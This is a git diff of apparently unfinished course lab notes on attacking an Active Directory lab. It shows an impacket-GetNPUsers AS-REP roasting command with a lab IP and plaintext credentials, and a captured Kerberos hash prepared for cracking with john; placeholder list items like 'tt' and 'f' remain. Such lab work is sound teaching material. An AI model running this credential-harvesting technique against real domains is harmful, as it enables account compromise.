@@ -101,19 +101,25 @@ As first attempt, we ask the DomainController the list of all accounts that can 
     `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request`
      `-format john`
 
-	From the output, we copy the string referring to the desired account in a `.txt` file.
+	From the output (*shown below*), we copy the string referring to the desired account in a **`.txt` file**.
+	
 	   `$krb5asrep$DNSoperator@CYBERSEC.UNITS.IT:8690a5aa5b288a036a49126539f292ef$afe3e87aafc
 	    35690745c5dfeb1f459dcc1ed858f1f4755d3aefa12921c93dbc35b35c0fd6094be7390eab67e0c016f96
-	    efad6f7ed8343a734e0f401c91ec09a83d11542d377f0d1daf690d7205a3b5d8316a2d1afdd0a6ac4b3e92fb4d6d295a60b074e549aa6a7c0e24cccfd7dd96cfdb06f908d38de6cb775f4fa44b5eae69bc2452fdfbbfa6ca73a70233a2f64e778d3bd286047a69ddf6fd99379b264f747034c32c66971240bede9becb6150fc85d516545f661aef05c22fc5c26a210a4243627cf681ea61f45996fb8d235b3f9d972433c390ff3b4250f576c96c54d167a61a76717831eb320b84aa37acef60cd3f1c781bf6e`
+	    efad6f7ed8343a734e0f401c91ec09a83d11542d377f0d1daf690d7205a3b5d8316a2d1afdd0a6ac4b3e9
+	    2fb4d6d295a60b074e549aa6a7c0e24cccfd7dd96cfdb06f908d38de6cb775f4fa44b5eae69bc2452fdfb
+	    bfa6ca73a70233a2f64e778d3bd286047a69ddf6fd99379b264f747034c32c66971240bede9becb6150fc
+	    85d516545f661aef05c22fc5c26a210a4243627cf681ea61f45996fb8d235b3f9d972433c390ff3b4250f
+	    576c96c54d167a61a76717831eb320b84aa37acef60cd3f1c781bf6e`
 
  
- 4. tt
+ 4. ttd
+ d
+ 
  5. ff
- 6. f
+ 6. tt
  7. f
  8. f
  9. f
- 10. f
 
 
 
@@ -148,9 +154,9 @@ nothing to commit, working tree clean
 `git status` is a command to verify the current state of your repository and the files it contains. Right now, we can see that we are on branch main, everything is up-to-date with origin/main and our working tree is clean.
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTExOTI2ODcyNDcsLTE4MTk4MTUyOTIsMj
-cxNzM0NDQ2LDkwNzAzMjc4LDE3MzYzOTc5NzIsMTIxMjI0NDE0
-MywxNTY1ODAwMjg3LC0yOTI1NDM5MzQsLTE0NDczODgzNjAsLT
-IwOTc2Nzg4NjMsMTA5NjE4MDExNSwtMTgxNDU3MjkwOCwtMjEx
-MjAxMDU4OCwtNDcyODY5OTM3LC0xMjQ3NzA2OTExXX0=
+eyJoaXN0b3J5IjpbLTQ4MjU4NzQ0MywtMTgxOTgxNTI5MiwyNz
+E3MzQ0NDYsOTA3MDMyNzgsMTczNjM5Nzk3MiwxMjEyMjQ0MTQz
+LDE1NjU4MDAyODcsLTI5MjU0MzkzNCwtMTQ0NzM4ODM2MCwtMj
+A5NzY3ODg2MywxMDk2MTgwMTE1LC0xODE0NTcyOTA4LC0yMTEy
+MDEwNTg4LC00NzI4Njk5MzcsLTEyNDc3MDY5MTFdfQ==
 -->
